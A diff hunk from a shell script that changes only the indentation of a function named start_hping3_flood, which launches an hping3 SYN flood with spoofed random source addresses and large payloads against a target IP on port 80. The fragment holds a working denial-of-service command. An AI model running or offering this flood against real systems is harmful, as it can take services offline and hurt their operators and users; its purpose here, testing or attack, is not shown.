@@ -323,11 +323,11 @@ start_hping3_flood() {
     log "Starting hping3 IP fragment attack to $TARGET_IP"
     
     hping3 \
-	-S \
+		-S \
         --flood \
         -p 80 \
-	--rand-source \
-	-d 7500 \
+		--rand-source \
+		-d 7500 \
         --interface "$INTERFACE" \
         "$TARGET_IP" \
         >> "$LOG_FILE" 2>&1 &
